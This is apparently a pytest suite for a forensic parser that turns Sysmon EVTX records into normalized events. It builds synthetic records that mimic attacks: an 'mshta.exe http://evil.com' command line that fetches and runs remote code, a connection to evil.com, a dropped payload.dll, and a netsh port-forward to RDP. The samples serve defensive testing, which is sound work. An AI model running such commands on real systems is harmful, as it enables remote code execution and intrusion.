"""
Tests for the forensic workspace parser — Phase 4.

Covers:
  - Per-EID dissectors (EID 1/3/11/13) with synthetic raw records
  - Dispatch: unknown EID returns None; bad dissector logs + returns None
  - evtx_reader: reads all four sample EVTX fixtures cleanly
  - EvtxAdapter.can_handle: extension + magic-byte detection
  - EvtxAdapter.parse: end-to-end integration against real fixtures

Run from backend/:
  python -m pytest tests/test_forensic_parser.py -v
"""

import sys
from datetime import datetime, timezone
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).parent.parent))

from workspaces.forensic.parser.event import Event
from workspaces.forensic.parser.dissectors import DISSECTORS
from workspaces.forensic.parser.dissectors.dispatch import dispatch
from workspaces.forensic.parser.evtx_reader import read_evtx
from workspaces.forensic.parser.adapters.evtx_adapter import EvtxAdapter

FIXTURES = Path(__file__).parent / "fixtures" / "sysmon"

LETHAL_HTA    = FIXTURES / "LM_DCOM_MSHTA_LethalHTA_Sysmon_3_1.evtx"
EXEC_PERSIST  = FIXTURES / "exec_persist_rundll32_mshta_scheduledtask_sysmon_1_3_11.evtx"
DE_PORT       = FIXTURES / "de_portforward_netsh_rdp_sysmon_13_1.evtx"
EXEC_RUNDLL32 = FIXTURES / "exec_sysmon_1_rundll32_pcwutl_LaunchApplication.evtx"

ALL_FIXTURES = [LETHAL_HTA, EXEC_PERSIST, DE_PORT, EXEC_RUNDLL32]

_TS = datetime(2024, 1, 15, 12, 0, 0)


# ── Helpers ─────────────────────────────────────────────────────────────────

def _raw(eid: int, event_data: dict, **extra) -> dict:
    return {
        "eid": eid,
        "record_id": 1,
        "time_created": _TS,
        "computer": "TEST-PC",
        "provider": "Microsoft-Windows-Sysmon",
        "event_data": event_data,
        **extra,
    }


# ── Dissector registry ───────────────────────────────────────────────────────

def test_dissectors_registered():
    assert set(DISSECTORS.keys()) == {1, 3, 11, 13}


# ── Dispatch ─────────────────────────────────────────────────────────────────

def test_dispatch_unknown_eid_returns_none():
    assert dispatch(_raw(999, {})) is None


def test_dispatch_non_int_eid_returns_none():
    assert dispatch({"eid": "bad", "event_data": {}}) is None


def test_dispatch_missing_eid_returns_none():
    assert dispatch({"event_data": {}}) is None


def test_dispatch_bad_dissector_returns_none(monkeypatch):
    def _boom(raw):
        raise RuntimeError("explode")
    monkeypatch.setitem(DISSECTORS, 99, _boom)
    assert dispatch(_raw(99, {})) is None


# ── EID 1 — ProcessCreate ────────────────────────────────────────────────────

def _eid1_data(**overrides):
    base = {
        "UtcTime":           "2024-01-15 12:00:00.000",
        "ProcessGuid":       "{aaa}",
        "ProcessId":         "1234",
        "Image":             r"C:\Windows\System32\mshta.exe",
        "CommandLine":       "mshta.exe http://evil.com",
        "CurrentDirectory":  r"C:\Windows\System32\\",
        "User":              "DOMAIN\\user",
        "IntegrityLevel":    "High",
        "Hashes":            "MD5=DEADBEEF",
        "ParentProcessGuid": "{bbb}",
        "ParentProcessId":   "5678",
        "ParentImage":       r"C:\Windows\System32\svchost.exe",
        "ParentCommandLine": "svchost.exe -k netsvcs",
        "ParentUser":        "NT AUTHORITY\\SYSTEM",
    }
    base.update(overrides)
    return base


def test_eid1_action_type():
    evt = dispatch(_raw(1, _eid1_data()))
    assert evt.action_type == "process_create"


def test_eid1_dst_entity_fields():
    evt = dispatch(_raw(1, _eid1_data()))
    assert evt.dst_entity["type"] == "process"
    assert evt.dst_entity["guid"] == "{aaa}"
    assert evt.dst_entity["pid"] == 1234
    assert evt.dst_entity["image"] == r"C:\Windows\System32\mshta.exe"
    assert evt.dst_entity["user"] == "DOMAIN\\user"


def test_eid1_src_entity_from_parent():
    evt = dispatch(_raw(1, _eid1_data()))
    assert evt.src_entity["type"] == "process"
    assert evt.src_entity["guid"] == "{bbb}"
    assert evt.src_entity["pid"] == 5678
    assert evt.src_entity["image"] == r"C:\Windows\System32\svchost.exe"


def test_eid1_fields_populated():
    evt = dispatch(_raw(1, _eid1_data()))
    assert evt.fields["command_line"] == "mshta.exe http://evil.com"
    assert evt.fields["integrity_level"] == "High"
    assert "hashes" in evt.fields


def test_eid1_ts_from_event_data_utctime():
    evt = dispatch(_raw(1, _eid1_data()))
    assert evt.ts == datetime(2024, 1, 15, 12, 0, 0)


def test_eid1_ts_falls_back_to_time_created_when_utctime_missing():
    data = _eid1_data()
    del data["UtcTime"]
    fallback = datetime(2024, 6, 1, 8, 30, 0)
    evt = dispatch(_raw(1, data, time_created=fallback))
    assert evt.ts == fallback


def test_eid1_no_parent_gives_empty_src_entity():
    data = {k: v for k, v in _eid1_data().items()
            if not k.startswith("Parent")}
    evt = dispatch(_raw(1, data))
    assert evt.src_entity == {}


def test_eid1_empty_fields_dropped():
    data = _eid1_data(Hashes="", FileVersion="", Company="")
    evt = dispatch(_raw(1, data))
    assert "hashes" not in evt.fields
    assert "file_version" not in evt.fields
    assert "company" not in evt.fields


def test_eid1_source_provenance():
    evt = dispatch(_raw(1, _eid1_data()))
    assert evt.source["eid"] == 1
    assert evt.source["computer"] == "TEST-PC"


# ── EID 3 — NetworkConnect ───────────────────────────────────────────────────

def _eid3_data(**overrides):
    base = {
        "UtcTime":              "2024-01-15 12:00:00.000",
        "ProcessGuid":          "{ccc}",
        "ProcessId":            "4321",
        "Image":                r"C:\Windows\System32\mshta.exe",
        "User":                 "DOMAIN\\user",
        "Protocol":             "tcp",
        "Initiated":            "true",
        "SourceIsIpv6":         "false",
        "SourceIp":             "192.168.1.10",
        "SourceHostname":       "victim-pc",
        "SourcePort":           "52000",
        "DestinationIsIpv6":    "false",
        "DestinationIp":        "203.0.113.1",
        "DestinationHostname":  "evil.com",
        "DestinationPort":      "443",
        "DestinationPortName":  "https",
    }
    base.update(overrides)
    return base


def test_eid3_action_type():
    evt = dispatch(_raw(3, _eid3_data()))
    assert evt.action_type == "network_connect"


def test_eid3_initiated_true_remote_is_destination():
    evt = dispatch(_raw(3, _eid3_data(Initiated="true")))
    assert evt.dst_entity["ip"] == "203.0.113.1"
    assert evt.dst_entity["port"] == 443
    assert evt.dst_entity["hostname"] == "evil.com"
    assert evt.dst_entity["type"] == "endpoint"


def test_eid3_initiated_false_remote_is_source():
    data = _eid3_data(Initiated="false")
    evt = dispatch(_raw(3, data))
    assert evt.dst_entity["ip"] == "192.168.1.10"
    assert evt.dst_entity["port"] == 52000


def test_eid3_initiated_missing_defaults_to_destination():
    data = {k: v for k, v in _eid3_data().items() if k != "Initiated"}
    evt = dispatch(_raw(3, data))
    assert evt.dst_entity["ip"] == "203.0.113.1"


def test_eid3_local_side_preserved_in_fields():
    evt = dispatch(_raw(3, _eid3_data()))
    assert evt.fields["local_ip"] == "192.168.1.10"
    assert evt.fields["local_port"] == 52000
    assert evt.fields["initiated"] is True


def test_eid3_protocol_lowercased():
    evt = dispatch(_raw(3, _eid3_data(Protocol="TCP")))
    assert evt.fields["protocol"] == "tcp"


def test_eid3_src_entity_is_process():
    evt = dispatch(_raw(3, _eid3_data()))
    assert evt.src_entity["type"] == "process"
    assert evt.src_entity["guid"] == "{ccc}"
    assert evt.src_entity["image"] == r"C:\Windows\System32\mshta.exe"


# ── EID 11 — FileCreate ──────────────────────────────────────────────────────

def _eid11_data(**overrides):
    base = {
        "UtcTime":         "2024-01-15 12:00:00.000",
        "ProcessGuid":     "{ddd}",
        "ProcessId":       "9999",
        "Image":           r"C:\Windows\System32\rundll32.exe",
        "TargetFilename":  r"C:\Users\user\AppData\Roaming\payload.dll",
        "CreationUtcTime": "2024-01-15 11:59:00.000",
        "RuleName":        "-",
    }
    base.update(overrides)
    return base


def test_eid11_action_type():
    evt = dispatch(_raw(11, _eid11_data()))
    assert evt.action_type == "file_create"


def test_eid11_dst_entity_is_file():
    evt = dispatch(_raw(11, _eid11_data()))
    assert evt.dst_entity["type"] == "file"
    assert evt.dst_entity["path"] == r"C:\Users\user\AppData\Roaming\payload.dll"


def test_eid11_missing_target_gives_empty_dst():
    data = _eid11_data(TargetFilename="")
    evt = dispatch(_raw(11, data))
    assert evt.dst_entity == {}


def test_eid11_creation_time_in_fields():
    evt = dispatch(_raw(11, _eid11_data()))
    assert "creation_utc_time" in evt.fields


def test_eid11_src_entity_is_process():
    evt = dispatch(_raw(11, _eid11_data()))
    assert evt.src_entity["type"] == "process"
    assert evt.src_entity["pid"] == 9999


# ── EID 13 — RegistryValueSet ────────────────────────────────────────────────

def _eid13_data(**overrides):
    base = {
        "UtcTime":      "2024-01-15 12:00:00.000",
        "EventType":    "SetValue",
        "ProcessGuid":  "{eee}",
        "ProcessId":    "7777",
        "Image":        r"C:\Windows\System32\netsh.exe",
        "TargetObject": r"HKLM\SYSTEM\CurrentControlSet\Services\portproxy\v4tov4\tcp\0.0.0.0/8888",
        "Details":      "0.0.0.0/3389",
        "RuleName":     "TechniqueId=T1090",
    }
    base.update(overrides)
    return base


def test_eid13_action_type():
    evt = dispatch(_raw(13, _eid13_data()))
    assert evt.action_type == "registry_set"


def test_eid13_dst_entity_is_registry():
    evt = dispatch(_raw(13, _eid13_data()))
    assert evt.dst_entity["type"] == "registry"
    assert "portproxy" in evt.dst_entity["key"]


def test_eid13_missing_target_gives_empty_dst():
    data = _eid13_data(TargetObject="")
    evt = dispatch(_raw(13, data))
    assert evt.dst_entity == {}


def test_eid13_fields_contain_event_type_and_details():
    evt = dispatch(_raw(13, _eid13_data()))
    assert evt.fields["event_type"] == "SetValue"
    assert evt.fields["details"] == "0.0.0.0/3389"


def test_eid13_src_entity_is_process():
    evt = dispatch(_raw(13, _eid13_data()))
    assert evt.src_entity["type"] == "process"
    assert evt.src_entity["image"] == r"C:\Windows\System32\netsh.exe"


# ── evtx_reader: integration against real fixtures ───────────────────────────

@pytest.mark.parametrize("path", ALL_FIXTURES)
def test_evtx_reader_returns_records(path):
    records = read_evtx(str(path))
    assert len(records) > 0, f"Expected records from {path.name}"


@pytest.mark.parametrize("path", ALL_FIXTURES)
def test_evtx_reader_records_have_required_keys(path):
    records = read_evtx(str(path))
    for rec in records:
        assert isinstance(rec["eid"], int)
        assert isinstance(rec["event_data"], dict)
        # time_created may be None on malformed records but must be present
        assert "time_created" in rec


def test_evtx_reader_lethal_hta_has_eid1_and_eid3():
    records = read_evtx(str(LETHAL_HTA))
    eids = {r["eid"] for r in records}
    assert 1 in eids
    assert 3 in eids


def test_evtx_reader_exec_persist_has_eid1_3_11():
    records = read_evtx(str(EXEC_PERSIST))
    eids = {r["eid"] for r in records}
    assert 1 in eids
    assert 3 in eids
    assert 11 in eids


def test_evtx_reader_de_portforward_has_eid13():
    records = read_evtx(str(DE_PORT))
    eids = {r["eid"] for r in records}
    assert 13 in eids


def test_evtx_reader_exec_rundll32_has_eid1():
    records = read_evtx(str(EXEC_RUNDLL32))
    eids = {r["eid"] for r in records}
    assert 1 in eids


# ── EvtxAdapter ──────────────────────────────────────────────────────────────

def test_adapter_can_handle_by_extension():
    adapter = EvtxAdapter()
    assert adapter.can_handle(Path("sample.evtx"), b"")
    assert not adapter.can_handle(Path("sample.pcap"), b"")


def test_adapter_can_handle_by_magic():
    adapter = EvtxAdapter()
    magic = b"ElfFile\x00" + b"\x00" * 8
    assert adapter.can_handle(Path("noext"), magic)


def test_adapter_can_handle_rejects_wrong_magic():
    adapter = EvtxAdapter()
    assert not adapter.can_handle(Path("noext"), b"\x00" * 16)


@pytest.mark.parametrize("path", ALL_FIXTURES)
def test_adapter_parse_returns_events(path):
    adapter = EvtxAdapter()
    events = adapter.parse(path)
    assert len(events) > 0, f"Expected events from {path.name}"
    for evt in events:
        assert isinstance(evt, Event)
        assert evt.action_type != ""


def test_adapter_parse_lethal_hta_event_types():
    adapter = EvtxAdapter()
    events = adapter.parse(LETHAL_HTA)
    action_types = {e.action_type for e in events}
    assert "process_create" in action_types
    assert "network_connect" in action_types


def test_adapter_parse_de_portforward_has_registry_set():
    adapter = EvtxAdapter()
    events = adapter.parse(DE_PORT)
    action_types = {e.action_type for e in events}
    assert "registry_set" in action_types


def test_adapter_parse_exec_persist_has_file_create():
    adapter = EvtxAdapter()
    events = adapter.parse(EXEC_PERSIST)
    action_types = {e.action_type for e in events}
    assert "file_create" in action_types
